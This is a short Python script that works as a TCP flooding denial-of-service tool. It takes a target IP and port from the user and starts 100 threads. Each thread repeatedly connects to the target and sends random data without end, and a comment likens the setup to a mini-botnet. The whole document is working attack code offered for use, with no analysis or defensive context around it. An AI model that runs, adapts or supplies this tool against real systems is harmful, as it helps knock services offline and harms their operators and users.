import socket
import threading
import random
import time

target_ip = input("Target IP: ")
target_port = int(input("Target Port: "))

# Simulate multiple threads (like a mini-botnet)
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(random._urandom(1024))
            print(f"[+] Sent packet to {target_ip}:{target_port}")
            s.close()
        except:
            pass

for i in range(100):  # Number of threads
    thread = threading.Thread(target=attack)
    thread.start()
